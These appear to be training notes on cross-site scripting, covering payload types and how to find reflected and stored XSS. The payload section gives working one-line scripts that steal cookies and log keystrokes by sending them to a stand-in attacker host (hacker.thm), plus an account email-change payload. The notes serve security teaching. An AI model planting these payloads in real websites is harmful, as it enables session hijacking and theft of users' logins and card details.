Proof Of Concept:

This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:


```javascript
<script>alert('XSS');</script>
```


Session Stealing:

Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.

```javascript
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```


Key Logger:

The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.
```javascript
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```


Business Logic:

This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail(). Your payload could look like this:
```javascript
<script>user.changeEmail('attacker@hacker.thm');</script>
```

## Reflected XSS

Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.

Example Scenario:

A website where if you enter incorrect input, an error message is displayed. The content of the error message gets taken from the error parameter in the query string and is built directly into the page source

![image](https://user-images.githubusercontent.com/95729902/172070904-4e57b769-9c96-4646-8b77-a510e18ba623.png)

![image](https://user-images.githubusercontent.com/95729902/172070892-bd1c624c-0867-4ed5-928c-536bb09d3eb4.png)

The application doesn't check the contents of the error parameter, which allows the attacker to insert malicious code.

![image](https://user-images.githubusercontent.com/95729902/172070920-0b17f35f-7189-4e45-b992-95b0b738c63a.png)

![image](https://user-images.githubusercontent.com/95729902/172070923-4ca35f89-92ee-425e-974e-107fed1ecd95.png)

![image](https://user-images.githubusercontent.com/95729902/172070929-d6cc1466-77c8-468d-bcad-deda7d257131.png)

### How to test for Reflected XSS:

You'll need to test every possible point of entry; these include:

- Parameters in the URL Query String
- URL File Path
- Sometimes HTTP Headers (although unlikely exploitable in practice)

## Stored XSS

XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.

**Example Scenario**

A blog website that allows users to post comments. Unfortunately, these comments aren't checked for whether they contain JavaScript or filter out any malicious code. If we now post a comment containing JavaScript, this will be stored in the database, and every other user now visiting the article will have the JavaScript run in their browser.

![image](https://user-images.githubusercontent.com/95729902/172071022-9c32ab5d-e444-464b-ab6c-fbd5f6af254b.png)

How to test for Stored XSS:

You'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be:

- Comments on a blog
- User profile information
- Website Listings

A blog website that allows users to post comments. Unfortunately, these comments aren't checked for whether they contain JavaScript or filter out any malicious code. If we now post a comment containing JavaScript, this will be stored in the database, and every other user now visiting the article will have the JavaScript run in their browser.
